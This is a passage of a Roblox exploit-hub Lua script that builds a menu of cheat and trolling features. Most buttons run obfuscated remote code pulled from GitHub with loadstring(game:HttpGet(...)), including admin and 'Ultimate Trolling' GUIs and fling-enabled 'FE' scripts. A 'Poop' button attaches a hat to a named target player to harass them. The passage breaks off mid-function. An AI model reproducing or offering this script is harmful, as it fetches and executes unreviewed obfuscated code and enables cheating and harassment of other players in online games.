				Character:WaitForChild("Torso").Attachment2.Position = Vector3.new(-1.5,0.5,-1.5)  --left arm player
				Character:WaitForChild("Torso").Attachment3.Position = Vector3.new(0.5,-2,0) --right leg player
				Character:WaitForChild("Torso").Attachment4.Position = Vector3.new(1.5,0.2,-3) --right arm buddy
				Character:WaitForChild("Torso").Attachment5.Position = Vector3.new(-1.5,0.2,-3)  --left arm buddy
                Character:WaitForChild("Torso").Attachment6.Position = Vector3.new(0.55,-2,-3) --right leg buddy
				Character:WaitForChild("Torso").Attachment7.Position = Vector3.new(-0.55,-2,-3) --left leg buddy
				Character:WaitForChild("Torso").Attachment8.Position = Vector3.new(0,0,-3) --torso buddy


local MusicOnHat = false -- If You Want To Play Audio In Hat
local StartSound = Instance.new("Sound")
StartSound.SoundId = "rbxassetid://8595980577" -- place sound id here

StartSound.Parent = workspace:FindFirstChild(game.Players.LocalPlayer.Name).HumanoidRootPart


StartSound:Play()

local number = Random.new(tick()):NextNumber(1,3) 
print(number)
if number > 2 then

local hit1 = Instance.new("Sound")
hit1.SoundId = "rbxassetid://8011805384" -- place sound id here
hit1.Parent = workspace:FindFirstChild(game.Players.LocalPlayer.Name).HumanoidRootPart
hit1:Play()

print("Worked")
end






					Hats.rarmp.Handle.Attachment.Rotation = Vector3.new(-10,-30, 0)
				Hats.rlegp.Handle.Attachment.Rotation = Vector3.new(90,0,0)
				Hats.llegk.Handle.Attachment.Rotation = Vector3.new(90,0,5)
				Hats.torsok.Handle.Attachment.Rotation = Vector3.new(0,90,0)
				Hats.larmp.Handle.Attachment.Rotation = Vector3.new(0,10,0)
                Hats.rlegk.Handle.Attachment.Rotation = Vector3.new(90,0,-5)
				Hats.rarmk.Handle.Attachment.Rotation = Vector3.new(90,0,-10)
				Hats.larmk.Handle.Attachment.Rotation = Vector3.new(90,0,10)




print("Got here")


				att2.Position = Vector3.new(0,1.7,-3)
				att2.Rotation = Vector3.new(-20,180,-10)
				toggle = true
			else
				Character.Humanoid.HipHeight = 0
				Character:WaitForChild("Torso").Attachment1.Position = Vector3.new(1.3,0.8,-1.5) --right arm player
				Character:WaitForChild("Torso").Attachment2.Position = Vector3.new(-1.5,0.5,-1.5)  --left arm player
				Character:WaitForChild("Torso").Attachment3.Position = Vector3.new(0.5,-2,0) --right leg player
				Character:WaitForChild("Torso").Attachment4.Position = Vector3.new(1.5,0.2,-3) --right arm buddy
				Character:WaitForChild("Torso").Attachment5.Position = Vector3.new(-1.5,0.2,-3)  --left arm buddy
                Character:WaitForChild("Torso").Attachment6.Position = Vector3.new(0.55,-2,-3) --right leg buddy
				Character:WaitForChild("Torso").Attachment7.Position = Vector3.new(-0.55,-2,-3) --left leg buddy
				Character:WaitForChild("Torso").Attachment8.Position = Vector3.new(0,0,-3) --torso buddy



					Hats.rarmp.Handle.Attachment.Rotation = Vector3.new(-10,-30,0)
				Hats.rlegp.Handle.Attachment.Rotation = Vector3.new(90,0,0)
				Hats.llegk.Handle.Attachment.Rotation = Vector3.new(90,0,5)
				Hats.torsok.Handle.Attachment.Rotation = Vector3.new(0,90,0)
				Hats.larmp.Handle.Attachment.Rotation = Vector3.new(0,10,0)
                Hats.rlegk.Handle.Attachment.Rotation = Vector3.new(90,0,-5)
				Hats.rarmk.Handle.Attachment.Rotation = Vector3.new(90,0,-10)
				Hats.larmk.Handle.Attachment.Rotation = Vector3.new(90,0,10)







				att2.Position = Vector3.new(0,1.7,-3)
				att2.Rotation = Vector3.new(0,180,0)
				toggle = false
			end
		end
        end)
     end
}


HatTab:Button{
	Name = "Poop [R6]",
	Description = nil,
	Callback = function()
    getgenv().Target = ""; -- Player user or shorten --
local tog = true
local move = false
local jit = Vector3.new(25.01, 0, 0)
local Player = game:GetService("Players").LocalPlayer
local Character = Player.Character

function GS(serv) return game:GetService(serv) end
local plrs, RunService = GS("Players"), GS("RunService")
local plr = plrs.LocalPlayer
local Loop

function GetPlayer(str)
    local Found
    for i, v in pairs(plrs:GetPlayers()) do
        if v.Name:lower():find(str:lower()) then
            Found = v
            break
        end
    end
    return Found
end

local targetplayer = GetPlayer(Target)
if not targetplayer then
    warn("Target player not found")
    return
end

local targetplayerc = targetplayer.Character
local targetwc = game.Workspace:FindFirstChild(targetplayer.Name)
if not targetwc then
    warn("Target player's workspace not found")
    return
end

RunService.Heartbeat:Connect(function()
    Character["Poop"].Handle.Velocity = jit
end)

local Head = "Poop" -- press f9 and find the hat that looks like a head's name and put it here
local x = 0   -- Edit Position for head n +left and -Right
local y = -1.2   -- Edit Position for head up and down
local z = 0.2 -- Edit Position for head x3

Character:WaitForChild(Head).Handle.AccessoryWeld:Remove()

local alignpos = Instance.new("AlignPosition", Character)
local alignorien = Instance.new("AlignOrientation", Character)
local att1 = Instance.new("Attachment", Character:WaitForChild(Head).Handle)
local att2 = Instance.new("Attachment", targetwc:WaitForChild("Torso"))

alignpos.Attachment0 = att1
alignpos.Attachment1 = att2
alignpos.RigidityEnabled = false
alignpos.ReactionForceEnabled = false
alignpos.ApplyAtCenterOfMass = true
alignpos.MaxForce = 99999999
alignpos.MaxVelocity = math.huge
alignpos.Responsiveness = 200

alignorien.Attachment0 = att1
alignorien.Attachment1 = att2
alignorien.ReactionTorqueEnabled = false
alignorien.PrimaryAxisOnly = false
alignorien.MaxTorque = 99999999
alignorien.MaxAngularVelocity = math.huge
alignorien.Responsiveness = 200

att2.Position = Vector3.new(x, y, z)

Character:WaitForChild(Head).Handle.Attachment.Rotation = Vector3.new(120, 180, 0)


local MusicOnHat = false -- If You Want To Play Audio In Hat
local StartSound = Instance.new("Sound")
StartSound.SoundId = "rbxassetid://8548558777" -- place sound id here
StartSound.Volume = 0.1



StartSound.Parent = workspace:FindFirstChild(game.Players.LocalPlayer.Name).HumanoidRootPart

local YEET = Instance.new("Sound")
YEET.SoundId = "rbxassetid://525743689" -- place sound id here
YEET.Volume = 1



YEET.Parent = workspace:FindFirstChild(game.Players.LocalPlayer.Name).HumanoidRootPart


StartSound:Play()

wait(1)
StartSound:Play()
att2.Position = Vector3.new(0, -1.2, 0.3)

wait(0.1)
StartSound:Play()
att2.Position = Vector3.new(0, -1.3, 0.4)

wait(0.1)
StartSound:Play()
att2.Position = Vector3.new(0, -1.4, 0.5)

wait(0.1)
StartSound:Play()
att2.Position = Vector3.new(0, -1.5, 0.6)

wait(0.1)
StartSound:Play()
att2.Position = Vector3.new(0, -1.6, 0.7)

local zplus = 0.7
local yplus = -1.6
local rotplus = 120

wait(0.5)
YEET:Play()

while true do
    zplus = zplus + 20
    yplus = yplus + 3
    rotplus = rotplus + 100
    att1.Rotation = Vector3.new(rotplus, 180, 0)
    att2.Position = Vector3.new(0, yplus, zplus)
    wait(0.1)
end
     end
}


--SCRIPTS







local GenTab = GUI:Tab{
	Name = "Genesis",
	Icon = "http://www.roblox.com/asset/?id=7485051715"
}

GenTab:Button{
	Name = "Pistol",
	Description = nil,
	Callback = function()
    
    loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Pistol"))()
    
     end
}

GenTab:Button{
	Name = "Banisher",
	Description = nil,
	Callback = function()
    
    loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Banisher"))()
    
     end
}

GenTab:Button{
	Name = "Karambit",
	Description = nil,
	Callback = function()
    
    loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Karambit"))()
    
     end
}

GenTab:Button{
	Name = "Krystal Dance",
	Description = nil,
	Callback = function()
    
    loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Krystal%20Dance"))()
    
     end
}

GenTab:Button{
	Name = "Neptunian V",
	Description = nil,
	Callback = function()
    
    loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Neptunian%20V"))()
    
     end
}

GenTab:Button{
	Name = "Ban Hammer",
	Description = nil,
	Callback = function()
    
    loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Ban%20Hammer"))()
    
     end
}

GenTab:Button{
	Name = "Motorcycle",
	Description = nil,
	Callback = function()
    
    loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Motorcycle"))()
    
     end
}

GenTab:Button{
	Name = "Gale Fighter [FX]",
	Description = nil,
	Callback = function()
    
    -- SET THE VARIABLE BELOW TO TRUE TO DISABLE ALL EFFECTS, COULD HELP WITH PERFORMANCE ISSUES
DisableFX = false

loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Star%20Glitcher"))()
    
     end
}

GenTab:Button{
	Name = "Gale Fighter [NO FX]",
	Description = nil,
	Callback = function()
    
    -- SET THE VARIABLE BELOW TO TRUE TO DISABLE ALL EFFECTS, COULD HELP WITH PERFORMANCE ISSUES
DisableFX = true

loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Star%20Glitcher"))()
    
     end
}

GenTab:Button{
	Name = "Linked Sword",
	Description = nil,
	Callback = function()
    
DisableFlingHealthBar = false

loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Linked%20Sword"))()
    
     end
}

GenTab:Button{
	Name = "Neko",
	Description = nil,
	Callback = function()
    
DisableFlingHealthBar = false

loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Neko"))()
    
     end
}

GenTab:Button{
	Name = "Lightning Cannon",
	Description = nil,
	Callback = function()
    
loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Lightning%20Cannon"))()
    
     end
}

GenTab:Button{
	Name = "Studio Dummy",
	Description = nil,
	Callback = function()
    
--[[
_________                       _____            ___________________
__  ____/__________________________(_)_______    ___  ____/__  ____/
_  / __ _  _ \_  __ \  _ \_  ___/_  /__  ___/    __  /_   __  __/   
/ /_/ / /  __/  / / /  __/(__  )_  / _(__  )     _  __/   _  /___   
\____/  \___//_/ /_/\___//____/ /_/  /____/      /_/      /_____/   							

by rqz					
https://discord.com/invite/aEZpBEHgMT
]]--

--====================================--
--           FDless Options           --
--====================================--

allowshiftlock = true --adds shiftlock to patchma rig
ctrltp = true --adds control click tp
placeholders = false --adds transparent parts showing your hats when you don't have real ones
clickfling = false --adds click flinging regardless of attacks
highlightflingtargets = true --highlight fling
discharscripts = true --disable character scripts
flingchangestate = true --fling with whole body
respawntp = 3 --respawn tp mode
-- 0 - stay at spawn
-- 1 - randomtp close
-- 2 - behind fake character
-- 3 - hide body
breakjointsmethod = 1 --breakjoints mode
-- 1 - health+breakjoints (the most support)
-- 2 - health or breakjoints
-- 3 - breakjoints
simrad = true --sets simulation radius

--==========================================================================================================================--

loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Studio%20Dummy"))()

--==========================================================================================================================--
    
     end
}

GenTab:Button{
	Name = "Good Cop Bad Cop",
	Description = nil,
	Callback = function()
    
--[[
_________                       _____            ___________________
__  ____/__________________________(_)_______    ___  ____/__  ____/
_  / __ _  _ \_  __ \  _ \_  ___/_  /__  ___/    __  /_   __  __/   
/ /_/ / /  __/  / / /  __/(__  )_  / _(__  )     _  __/   _  /___   
\____/  \___//_/ /_/\___//____/ /_/  /____/      /_/      /_____/   							

by rqz					
https://discord.com/invite/aEZpBEHgMT
]]--

--====================================--
--           FDless Options           --
--====================================--

allowshiftlock = true --adds shiftlock to patchma rig
ctrltp = true --adds control click tp
placeholders = true --adds transparent parts showing your hats when you don't have real ones
clickfling = false --adds click flinging regardless of attacks
highlightflingtargets = true --highlight fling
discharscripts = true --disable character scripts
flingchangestate = true --fling with whole body
respawntp = 3 --respawn tp mode
-- 0 - stay at spawn
-- 1 - randomtp close
-- 2 - behind fake character
-- 3 - hide body
breakjointsmethod = 1 --breakjoints mode
-- 1 - health+breakjoints (the most support)
-- 2 - health or breakjoints
-- 3 - breakjoints
simrad = true --sets simulation radius

--==========================================================================================================================--

loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Good%20Cop%20Bad%20Cop"))()

--==========================================================================================================================--
    
     end
}

GenTab:Button{
	Name = "Dearsister",
	Description = nil,
	Callback = function()
    
--[[
_________                       _____            ___________________
__  ____/__________________________(_)_______    ___  ____/__  ____/
_  / __ _  _ \_  __ \  _ \_  ___/_  /__  ___/    __  /_   __  __/   
/ /_/ / /  __/  / / /  __/(__  )_  / _(__  )     _  __/   _  /___   
\____/  \___//_/ /_/\___//____/ /_/  /____/      /_/      /_____/   							

by rqz					
https://discord.com/invite/aEZpBEHgMT
]]--

--====================================--
--           FDless Options           --
--====================================--

allowshiftlock = true --adds shiftlock to patchma rig
ctrltp = true --adds control click tp
placeholders = true --adds transparent parts showing your hats when you don't have real ones
clickfling = false --adds click flinging regardless of attacks
highlightflingtargets = true --highlight fling
discharscripts = true --disable character scripts
flingchangestate = true --fling with whole body
respawntp = 3 --respawn tp mode
-- 0 - stay at spawn
-- 1 - randomtp close
-- 2 - behind fake character
-- 3 - hide body
breakjointsmethod = 1 --breakjoints mode
-- 1 - health+breakjoints (the most support)
-- 2 - health or breakjoints
-- 3 - breakjoints
simrad = true --sets simulation radius

--==========================================================================================================================--

loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Dearsister"))()

--==========================================================================================================================--
    
     end
}

GenTab:Button{
	Name = "Sadist Genocider",
	Description = nil,
	Callback = function()
    
--[[
_________                       _____            ___________________
__  ____/__________________________(_)_______    ___  ____/__  ____/
_  / __ _  _ \_  __ \  _ \_  ___/_  /__  ___/    __  /_   __  __/   
/ /_/ / /  __/  / / /  __/(__  )_  / _(__  )     _  __/   _  /___   
\____/  \___//_/ /_/\___//____/ /_/  /____/      /_/      /_____/   							

by rqz					
https://discord.com/invite/aEZpBEHgMT
]]--

--====================================--
--           FDless Options           --
--====================================--

allowshiftlock = true --adds shiftlock to patchma rig
ctrltp = true --adds control click tp
placeholders = true --adds transparent parts showing your hats when you don't have real ones
clickfling = false --adds click flinging regardless of attacks
highlightflingtargets = true --highlight fling
discharscripts = true --disable character scripts
flingchangestate = true --fling with whole body
respawntp = 3 --respawn tp mode
-- 0 - stay at spawn
-- 1 - randomtp close
-- 2 - behind fake character
-- 3 - hide body
breakjointsmethod = 1 --breakjoints mode
-- 1 - health+breakjoints (the most support)
-- 2 - health or breakjoints
-- 3 - breakjoints
simrad = true --sets simulation radius

--==========================================================================================================================--

loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Sadist%20Genocider"))()

--==========================================================================================================================--
    
     end
}

GenTab:Button{
	Name = "AK-47",
	Description = nil,
	Callback = function()
    
--[[
_________                       _____            ___________________
__  ____/__________________________(_)_______    ___  ____/__  ____/
_  / __ _  _ \_  __ \  _ \_  ___/_  /__  ___/    __  /_   __  __/   
/ /_/ / /  __/  / / /  __/(__  )_  / _(__  )     _  __/   _  /___   
\____/  \___//_/ /_/\___//____/ /_/  /____/      /_/      /_____/   							

by rqz					
https://discord.com/invite/aEZpBEHgMT
]]--

--====================================--
--           FDless Options           --
--====================================--

allowshiftlock = true --adds shiftlock to patchma rig
ctrltp = false --adds control click tp
placeholders = true --adds transparent parts showing your hats when you don't have real ones
clickfling = false --adds click flinging regardless of attacks
highlightflingtargets = true --highlight fling
discharscripts = true --disable character scripts
flingchangestate = true --fling with whole body
respawntp = 3 --respawn tp mode
-- 0 - stay at spawn
-- 1 - randomtp close
-- 2 - behind fake character
-- 3 - hide body
breakjointsmethod = 1 --breakjoints mode
-- 1 - health+breakjoints (the most support)
-- 2 - health or breakjoints
-- 3 - breakjoints
simrad = true --sets simulation radius

--==========================================================================================================================--

loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/AK-47"))()

--==========================================================================================================================--
    
     end
}

GenTab:Button{
	Name = "Goner",
	Description = nil,
	Callback = function()
    
--[[
_________                       _____            ___________________
__  ____/__________________________(_)_______    ___  ____/__  ____/
_  / __ _  _ \_  __ \  _ \_  ___/_  /__  ___/    __  /_   __  __/   
/ /_/ / /  __/  / / /  __/(__  )_  / _(__  )     _  __/   _  /___   
\____/  \___//_/ /_/\___//____/ /_/  /____/      /_/      /_____/   							

by rqz					
https://discord.com/invite/aEZpBEHgMT
]]--

--====================================--
--           FDless Options           --
--====================================--

allowshiftlock = true --adds shiftlock to patchma rig
ctrltp = true --adds control click tp
placeholders = true --adds transparent parts showing your hats when you don't have real ones
clickfling = false --adds click flinging regardless of attacks
highlightflingtargets = true --highlight fling
discharscripts = true --disable character scripts
flingchangestate = true --fling with whole body
respawntp = 3 --respawn tp mode
-- 0 - stay at spawn
-- 1 - randomtp close
-- 2 - behind fake character
-- 3 - hide body
breakjointsmethod = 1 --breakjoints mode
-- 1 - health+breakjoints (the most support)
-- 2 - health or breakjoints
-- 3 - breakjoints
simrad = true --sets simulation radius

--==========================================================================================================================--

loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Goner"))()

--==========================================================================================================================--
    
     end
}

GenTab:Button{
	Name = "Sniper",
	Description = nil,
	Callback = function()
    
--[[
_________                       _____            ___________________
__  ____/__________________________(_)_______    ___  ____/__  ____/
_  / __ _  _ \_  __ \  _ \_  ___/_  /__  ___/    __  /_   __  __/   
/ /_/ / /  __/  / / /  __/(__  )_  / _(__  )     _  __/   _  /___   
\____/  \___//_/ /_/\___//____/ /_/  /____/      /_/      /_____/   							

by rqz					
https://discord.com/invite/aEZpBEHgMT
]]--

--====================================--
--           FDless Options           --
--====================================--

allowshiftlock = true --adds shiftlock to patchma rig
ctrltp = true --adds control click tp
placeholders = true --adds transparent parts showing your hats when you don't have real ones
clickfling = false --adds click flinging regardless of attacks
highlightflingtargets = true --highlight fling
discharscripts = true --disable character scripts
flingchangestate = true --fling with whole body
respawntp = 3 --respawn tp mode
-- 0 - stay at spawn
-- 1 - randomtp close
-- 2 - behind fake character
-- 3 - hide body
breakjointsmethod = 1 --breakjoints mode
-- 1 - health+breakjoints (the most support)
-- 2 - health or breakjoints
-- 3 - breakjoints
simrad = true --sets simulation radius

--==========================================================================================================================--

loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Sniper"))()

--==========================================================================================================================--

    
     end
}

GenTab:Button{
	Name = "Minigun",
	Description = nil,
	Callback = function()
    
--[[
_________                       _____            ___________________
__  ____/__________________________(_)_______    ___  ____/__  ____/
_  / __ _  _ \_  __ \  _ \_  ___/_  /__  ___/    __  /_   __  __/   
/ /_/ / /  __/  / / /  __/(__  )_  / _(__  )     _  __/   _  /___   
\____/  \___//_/ /_/\___//____/ /_/  /____/      /_/      /_____/   							

by rqz					
https://discord.com/invite/aEZpBEHgMT
]]--

--====================================--
--           FDless Options           --
--====================================--

allowshiftlock = true --adds shiftlock to patchma rig
ctrltp = true --adds control click tp
placeholders = true --adds transparent parts showing your hats when you don't have real ones
clickfling = false --adds click flinging regardless of attacks
highlightflingtargets = true --highlight fling
discharscripts = true --disable character scripts
flingchangestate = true --fling with whole body
respawntp = 3 --respawn tp mode
-- 0 - stay at spawn
-- 1 - randomtp close
-- 2 - behind fake character
-- 3 - hide body
breakjointsmethod = 1 --breakjoints mode
-- 1 - health+breakjoints (the most support)
-- 2 - health or breakjoints
-- 3 - breakjoints
simrad = true --sets simulation radius

--==========================================================================================================================--

loadstring(game:HttpGet("https://raw.githubusercontent.com/GenesisFE/Genesis/main/Obfuscations/Minigun"))()

--==========================================================================================================================--
    
     end
}



local GamesTab = GUI:Tab{
	Name = "Games",
	Icon = "http://www.roblox.com/asset/?id=18519880309"
}

GamesTab:Button{
	Name = "Murder Mystery 2",
	Description = nil,
	Callback = function() 
    loadstring(game:HttpGetAsync("https://raw.githubusercontent.com/Drifter0507/GUIS/main/MURDER%20MYSTERY%202", true))()
    end
}

local BootTab = GUI:Tab{
	Name = "Boot",
	Icon = "http://www.roblox.com/asset/?id=11348555035"
}

BootTab:Button{
	Name = "Infinite Yield",
	Description = nil,
	Callback = function() 
    loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
    end
}

BootTab:Button{
	Name = "Ultimate Trolling GUI",
	Description = nil,
	Callback = function() 
    loadstring(game:HttpGet("https://raw.githubusercontent.com/Blukez/Scripts/main/UTG%20V3%20RAW"))()
    end
}

BootTab:Button{
	Name = "Homebrew Admin",
	Description = nil,
	Callback = function() 
    
if not game:IsLoaded() then
    game.Loaded:Wait()
end
local start = os.clock()
local succ,err = pcall(function()
local rbxmSuite = loadstring(game:HttpGetAsync("https://github.com/richie0866/rbxm-suite/releases/latest/download/rbxm-suite.lua"))()

local path = rbxmSuite.download("Syntaxx64/HomebrewAdmin@latest", "Homebrew.rbxm")
-- Download the latest RBXM
rbxmSuite.launch(path, {
    runscripts=true,
    deferred = true,
    nocirculardeps = true
})

-- Launch using rbxmSuite
end)
if err then
    local Rostruct = loadstring(game:HttpGetAsync("https://github.com/richie0866/Rostruct/releases/download/v1.1.11/Rostruct.lua"))()
    Rostruct.fetchLatest("Syntaxx64", "HomebrewAdmin")
        :andThen(function(pkg)
            pkg:build("src/")
            pkg:start()
            return pkg
        end)

        :expect()
end
warn("Homebrew loaded in " ..string.format("%.2f", os.clock() - start))
    end
}

local CsTab = GUI:Tab{
	Name = "Client Sided",
	Icon = "http://www.roblox.com/asset/?id=11698445336"
}


local curtime = game:GetService("Lighting"):GetMinutesAfterMidnight()

CsTab:Slider{
	Name = "Time",
	Default = curtime,
	Min = 0,
	Max = 1440,
	Callback = function(Value)
    game:GetService("Lighting"):SetMinutesAfterMidnight(Value) 
     end
}

CsTab:Button{
	Name = "Deafault Time",
	Description = nil,
	Callback = function()
    game:GetService("Lighting"):SetMinutesAfterMidnight(curtime)
     end
}



local selectedObject = "SmallBlock"  -- Set default selection
local buildMode = false
local objectMoverMode = false
local objectRemoverMode = false
local spawnedObjects = {}

-- Dropdown for selecting the object to spawn
local MyDropdown = CsTab:Dropdown{
    Name = "Object",
    StartingText = "Small Block",
    Description = "Building Block",
    Items = {
        {"Big Block", "BigBlock"},  -- {display name, internal value}
        {"Small Block", "SmallBlock"},
        {"Anchored Ball", "AnchoredBall"},  -- Anchored ball option
        {"Unanchored Ball", "UnanchoredBall"},  -- Unanchored ball option
        {"Rig", "Rig"}  -- R6 Rig option
    },
    Callback = function(item)
        selectedObject = item  -- Store the internal value
    end
}

-- Toggle to enable or disable build mode
CsTab:Toggle{
    Name = "Build Mode",
    StartingState = false,
    Description = "Toggle to enable building mode",
    Callback = function(state)
        buildMode = state
        print("Build Mode: " .. tostring(buildMode))
    end
}

-- Toggle to enable or disable object mover mode
CsTab:Toggle{
    Name = "Object Mover",
    StartingState = false,
    Description = "Toggle to move objects",
    Callback = function(state)
        objectMoverMode = state
        print("Object Mover Mode: " .. tostring(objectMoverMode))
    end
}

-- Toggle to enable or disable object remover mode
CsTab:Toggle{
    Name = "Object Remover",
    StartingState = false,
    Description = "Toggle to remove objects",
    Callback = function(state)
        objectRemoverMode = state
        print("Object Remover Mode: " .. tostring(objectRemoverMode))
    end
}

-- Button to remove all spawned objects
CsTab:Button{
    Name = "Remove All Objects",
    Description = "Removes all objects you have placed",
    Callback = function()
        for _, obj in pairs(spawnedObjects) do
            if obj then
                obj:Destroy()
            end
        end
        spawnedObjects = {}  -- Clear the list
        print("All objects removed.")
    end
}

-- Function to spawn the object
local function spawnObject(position)
    if selectedObject then
        local newObject = Instance.new("Part")

        -- Set the size and shape based on the selected object
        local size
        if selectedObject == "BigBlock" then
            size = Vector3.new(10, 10, 10)  -- Big block size
            newObject.Shape = Enum.PartType.Block
            newObject.Anchored = true  -- Anchored by default
        elseif selectedObject == "SmallBlock" then
            size = Vector3.new(5, 5, 5)  -- Small block size
            newObject.Shape = Enum.PartType.Block
            newObject.Anchored = true  -- Anchored by default
        elseif selectedObject == "AnchoredBall" then
            size = Vector3.new(5, 5, 5)  -- Size for the anchored ball
            newObject.Shape = Enum.PartType.Ball
            newObject.Anchored = true  -- Anchored
        elseif selectedObject == "UnanchoredBall" then
            size = Vector3.new(5, 5, 5)  -- Size for the unanchored ball
            newObject.Shape = Enum.PartType.Ball
            newObject.Anchored = false  -- Unanchored
             elseif selectedObject == "Rig" then
            newObject = game:GetService("Players"):CreateHumanoidModelFromUserId(game.Players.LocalPlayer.UserId)
            newObject:SetPrimaryPartCFrame(CFrame.new(position))
            newObject.Parent = workspace
        end

        newObject.Size = size
        newObject.Position = position + Vector3.new(0, size.Y / 2, 0)  -- Move up half the height of the object
        newObject.Parent = workspace
        table.insert(spawnedObjects, newObject)  -- Store the object for later removal
        print("Spawned " .. selectedObject .. " at " .. tostring(newObject.Position))
    else
        print("No object selected.")
    end
end

-- Detect mouse clicks to spawn the object, move it, or remove it
local player = game.Players.LocalPlayer
local mouse = player:GetMouse()
local draggingObject = nil
local highlightInstance = nil
local offset = Vector3.new(0, 0, 0)  -- Offset for dragging

mouse.Button1Down:Connect(function()
    if buildMode and selectedObject then
        local mouseHit = mouse.Hit
        local mousePosition = mouseHit.p
        spawnObject(mousePosition)  -- Spawn at the mouse hit position
    elseif objectMoverMode then
        local targetObject = mouse.Target  -- Get the clicked object
        if targetObject and table.find(spawnedObjects, targetObject) then
            -- Highlight the object
            if highlightInstance then
                highlightInstance:Destroy()  -- Remove previous highlight if any
            end
            highlightInstance = Instance.new("Highlight")
            highlightInstance.Adornee = targetObject
            highlightInstance.FillColor = Color3.fromRGB(0, 0, 139)  -- Dark blue color for highlighting
            highlightInstance.FillTransparency = 0.5  -- Slightly transparent
            highlightInstance.Parent = targetObject
            
            draggingObject = targetObject

            -- Calculate the offset based on the position of the mouse and the object's position
            offset = draggingObject.Position - mouse.Hit.p + Vector3.new(0, draggingObject.Size.Y / 2, 0)
        end
    elseif objectRemoverMode then
        local targetObject = mouse.Target  -- Get the clicked object
        if targetObject and table.find(spawnedObjects, targetObject) then
            targetObject:Destroy()  -- Remove the object
            -- Update the spawned objects list
            for i = #spawnedObjects, 1, -1 do
                if spawnedObjects[i] == targetObject then
                    table.remove(spawnedObjects, i)
                    break
                end
            end
            print("Removed object at " .. tostring(targetObject.Position))
        end
    else
        if not buildMode then
           
        elseif not selectedObject then
            print("No object selected.")
        end
    end
end)

mouse.Button1Up:Connect(function()
    if draggingObject then
        -- Remove highlight and stop dragging
        if highlightInstance then
            highlightInstance:Destroy()
            highlightInstance = nil
        end
        draggingObject = nil
    end
end)

mouse.Move:Connect(function()
    if draggingObject then
        -- Move the object to the mouse position while dragging, considering the offset
        local mouseHit = mouse.Hit
        local mousePosition = mouseHit.p

        -- Set the new position based on mouse position and offset
        draggingObject.Position = mousePosition + offset
    end
end)




local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local workspace = game:GetService("Workspace")

-- Sound asset IDs
local blinkSoundId = "rbxassetid://9067330158"  -- Sound for blinking red
local explosionSoundId = "rbxassetid://165969964"  -- Sound for missile landing
local missileSoundId = "rbxassetid://9125692429"  -- Replace with your missile launch sound ID

-- Function to create explosion particles
local function createExplosionParticles(position)
    local explosion = Instance.new("Explosion")
    explosion.Position = position
    explosion.BlastRadius = 10
    explosion.BlastPressure = 0
    explosion.ExplosionType = Enum.ExplosionType.NoCraters
    explosion.Parent = workspace

    -- Create explosion particles
    local particleEmitter = Instance.new("ParticleEmitter")
    particleEmitter.Parent = explosion
    particleEmitter.Lifetime = NumberRange.new(1)
    particleEmitter.Rate = 100
    particleEmitter.Size = NumberSequence.new(1, 5)
    particleEmitter.Color = ColorSequence.new(Color3.new(1, 0, 0), Color3.new(1, 1, 0))

    -- Emit particles
    particleEmitter:Emit(100)

    -- Play explosion sound
    local explosionSound = Instance.new("Sound")
    explosionSound.SoundId = explosionSoundId
    explosionSound.Parent = explosion
    explosionSound:Play()
end

-- Function to create a screen shake effect
local function screenShake(duration)
    local playerGui = player:WaitForChild("PlayerGui")
    local shakeFrame = Instance.new("Frame")
    shakeFrame.Size = UDim2.new(1, 0, 1, 0)
    shakeFrame.BackgroundColor3 = Color3.new(0, 0, 0)
    shakeFrame.BackgroundTransparency = 1  -- Make it invisible
    shakeFrame.Parent = playerGui

    local endTime = tick() + duration
    while tick() < endTime do
        -- Randomly position the shake frame
        shakeFrame.Position = UDim2.new(0, math.random(-10, 10), 0, math.random(-10, 10))
        wait(0.05)  -- Adjust the frequency of the shake
    end

    shakeFrame:Destroy()  -- Remove the shake frame after the effect
end

-- Function to launch the missile
local function launchMissile(targetPosition)
    local missile = Instance.new("Part")
    missile.Size = Vector3.new(2, 2, 8)  -- Larger missile size
    missile.Position = targetPosition + Vector3.new(0, math.random(100, 200), 0)  -- Start at a random height above the player
    missile.Anchored = false
    missile.CanCollide = true
    missile.BrickColor = BrickColor.new("Bright red")
    missile.Material = Enum.Material.Metal
    missile.Parent = workspace

    -- Create a sound for the missile
    local missileSound = Instance.new("Sound")
    missileSound.SoundId = missileSoundId
    missileSound.Parent = missile
    missileSound:Play()

    -- Rotate missile to point down
    missile.CFrame = CFrame.new(missile.Position) * CFrame.Angles(math.rad(-90), 0, 0)

    -- Launch the missile
    local direction = Vector3.new(0, -1, 0)  -- Pointing straight down
    local bodyVelocity = Instance.new("BodyVelocity")
    bodyVelocity.Velocity = direction * 100  -- Adjust speed as necessary
    bodyVelocity.MaxForce = Vector3.new(10000, 10000, 10000)
    bodyVelocity.Parent = missile

    -- Connect a function to handle missile impact
    missile.Touched:Connect(function(hit)
        if hit:IsA("BasePart") then
